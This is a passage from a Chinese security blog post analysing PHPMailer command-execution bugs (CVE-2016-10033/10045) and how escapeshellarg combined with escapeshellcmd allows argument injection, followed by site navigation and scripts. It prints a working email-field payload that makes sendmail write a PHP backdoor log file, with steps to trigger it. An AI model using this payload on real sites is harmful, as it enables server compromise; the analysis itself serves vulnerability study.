class="function"></span>&#123;</span><br><span class="line">    $toArr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;to <span class="keyword">as</span> $toaddr) &#123;</span><br><span class="line">        $toArr[] = <span class="keyword">$this</span>-&gt;addrFormat($toaddr);</span><br><span class="line">    &#125;</span><br><span class="line">    $to = implode(<span class="string">', '</span>, $toArr);</span><br><span class="line">    $params = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//This sets the SMTP envelope sender which gets turned into a return-path header by the receiver</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender) <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;validateAddress(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $params = sprintf(<span class="string">'-f%s'</span>, escapeshellarg(<span class="keyword">$this</span>-&gt;Sender));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender) <span class="keyword">and</span> !ini_get(<span class="string">'safe_mode'</span>) <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;validateAddress(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $old_from = ini_get(<span class="string">'sendmail_from'</span>);</span><br><span class="line">        ini_set(<span class="string">'sendmail_from'</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">    &#125;</span><br><span class="line">    $result = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo <span class="keyword">and</span> count($toArr) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($toArr <span class="keyword">as</span> $toAddr) &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;mailPassthru($toAddr, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">array</span>($toAddr), <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;mailPassthru($to, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">$this</span>-&gt;to, <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($old_from)) &#123;</span><br><span class="line">        ini_set(<span class="string">'sendmail_from'</span>, $old_from);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;lang(<span class="string">'instantiate'</span>), <span class="keyword">self</span>::STOP_CRITICAL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>做的修改主要是调用validateAddress()函数对\$this-&gt;Sender进行过滤，在将\$this-&gt;Sender拼接赋值给\$params之前调用escapeshellarg()进行过滤。</p>
<p>这里借个seebug的图对比会更清晰地看出官方修改的地方：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/20.png" alt=""></p>
<p>在之前的CVE-2016-10033中的payload<code>a( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com</code>已经用不了了，因为调用了escapeshellarg()进行过滤，但是在其中添加单引号即可Bypass，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos;( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com</span><br></pre></td></tr></table></figure>
<p>为什么添加个单引号就可以Bypass escapeshellarg()的过滤呢？——这里可以参考前面第二节说的escapeshellarg&gt;escapeshellcmd参数注入即可。</p>
<p>这里我们看下mail()函数的源码，可以看到传入的额外参数是会经过escapeshellcmd()函数过滤的，也就是说满足了前面escapeshellarg&gt;escapeshellcmd参数注入的前提条件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (force_extra_parameters) &#123;</span><br><span class="line">    extra_cmd = php_escape_shell_cmd(force_extra_parameters);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (extra_cmd) &#123;</span><br><span class="line">    extra_cmd = php_escape_shell_cmd(extra_cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (php_mail(to_r, subject_r, message, headers_trimmed, extra_cmd TSRMLS_CC)) &#123;</span><br><span class="line">    RETVAL_TRUE;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    RETVAL_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>在email表项处输入payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos;( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com</span><br></pre></td></tr></table></figure>
<p>在其他项随意一栏输入恶意PHP代码即可。如下：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/21.png" alt=""></p>
<p>等一会即可访问后门日志文件：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/23.png" alt=""></p>
<p>后台查看：</p>
<p><img src="/2019/07/04/浅谈escapeshellarg与参数注入/24.png" alt=""></p>
<h2 id="0x04-题目"><a href="#0x04-题目" class="headerlink" title="0x04 题目"></a>0x04 题目</h2><p>…</p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html" target="_blank" rel="noopener">谈escapeshellarg绕过与参数注入漏洞</a></p>
<p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98" target="_blank" rel="noopener">谈谈escapeshellarg参数绕过和注入的问题</a></p>
<p><a href="https://www.anquanke.com/post/id/107336" target="_blank" rel="noopener">利用/绕过 PHP escapeshellarg/escapeshellcmd函数</a></p>
<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>

    </div>

  </article>
  <div class="toc-container">
    
  <div id="toc" class="toc-article">
    <strong class="toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本概念"><span class="toc-text">0x01 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellarg"><span class="toc-text">escapeshellarg()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellcmd"><span class="toc-text">escapeshellcmd()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#两者区别"><span class="toc-text">两者区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mail-与sendmail"><span class="toc-text">mail()与sendmail</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-escapeshellarg与escapeshellcmd参数注入"><span class="toc-text">0x02 escapeshellarg与escapeshellcmd参数注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#何为参数注入"><span class="toc-text">何为参数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellarg-gt-escapeshellcmd参数注入"><span class="toc-text">escapeshellarg&gt;escapeshellcmd参数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tar参数注入"><span class="toc-text">tar参数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find参数注入"><span class="toc-text">find参数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wget参数注入"><span class="toc-text">wget参数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sendmail参数注入"><span class="toc-text">sendmail参数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl参数注入"><span class="toc-text">curl参数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass技巧——除非ASCII字符"><span class="toc-text">Bypass技巧——除非ASCII字符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞分析——PHPMailer命令执行漏洞"><span class="toc-text">0x03 漏洞分析——PHPMailer命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-10033"><span class="toc-text">CVE-2016-10033</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码审计"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击利用"><span class="toc-text">攻击利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-10045"><span class="toc-text">CVE-2016-10045</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码审计-1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击利用-1"><span class="toc-text">攻击利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-题目"><span class="toc-text">0x04 题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考"><span class="toc-text">0x05 参考</span></a></li></ol>
  </div>


  </div>
</div>
<div class="copyright">
    <span>本作品采用</span>
    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
    <span>进行许可。 转载时请注明原文链接。</span>
</div>


  
    <div class="post-nav">
      <div class="post-nav-item post-nav-next">
        
          <span>〈 </span>
          <a href="/2019/07/02/浅析preg-replace与preg-match/" rel="next" title="浅析preg_replace与preg_match">
          浅析preg_replace与preg_match
          </a>
        
      </div>
  
      <div class="post-nav-item post-nav-prev">
          
          <a href="/2019/07/16/PHP中mail-函数安全问题与防御/" rel="prev" title="PHP中mail()函数安全问题与防御">
            PHP中mail()函数安全问题与防御
          </a>
          <span>〉</span>
        
      </div>
    </div>
  


    </div>

    
    

  </div>
  <footer class="footer text-center">
    <div id="bottom-inner">
        <span>Copyright &copy; Mi1k7ea</span>  |  
        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
    </div>
</footer>

  

<script>
  (function(window, document, undefined) {

    var timer = null;

    function returnTop() {
      cancelAnimationFrame(timer);
      timer = requestAnimationFrame(function fn() {
        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
        if (oTop > 0) {
          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
          timer = requestAnimationFrame(fn);
        } else {
          cancelAnimationFrame(timer);
        }
      });
    }

    var hearts = [];
    window.requestAnimationFrame = (function() {
      return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function(callback) {
          setTimeout(callback, 1000 / 60);
        }
    })();
    init();

    function init() {
      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
      attachEvent();
      gameloop();
      addMenuEvent();
    }

    function gameloop() {
      for (var i = 0; i < hearts.length; i++) {
        if (hearts[i].alpha <= 0) {
          document.body.removeChild(hearts[i].el);
          hearts.splice(i, 1);
          continue;
        }
        hearts[i].y--;
        hearts[i].scale += 0.004;
        hearts[i].alpha -= 0.013;
        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
      }
      requestAnimationFrame(gameloop);
    }

    /**
     * 给logo设置点击事件
     * 
     * - 回到顶部
     * - 出现爱心
     */
    function attachEvent() {
      var old = typeof window.onclick === "function" && window.onclick;
      var logo = document.getElementById("logo");
      if (logo) {
        logo.onclick = function(event) {
          returnTop();
          old && old();
          createHeart(event);
        }
      }
      
    }

    function createHeart(event) {
      var d = document.createElement("div");
      d.className = "heart";
      hearts.push({
        el: d,
        x: event.clientX - 5,
        y: event.clientY - 5,
        scale: 1,
        alpha: 1,
        color: randomColor()
      });
      document.body.appendChild(d);
    }

    function css(css) {
      var style = document.createElement("style");
      style.type = "text/css";
      try {
        style.appendChild(document.createTextNode(css));
      } catch (ex) {
        style.styleSheet.cssText = css;
      }
      document.getElementsByTagName('head')[0].appendChild(style);
    }

    function randomColor() {
      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
      return "#F44336";
    }

    function addMenuEvent() {
      var menu = document.getElementById('menu-main-post');
      if (menu) {
        var toc = document.getElementById('toc');
        if (toc) {
          menu.onclick = function() {
            if (toc) {
              if (toc.style.display == 'block') {
                toc.style.display = 'none';
              } else {
                toc.style.display = 'block';
              }
            }
          };
        } else {
          menu.style.display = 'none';
        }
      }
    }

  })(window, document);
</script>

  



  
<script>
  (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();
</script>


</body>
</html>
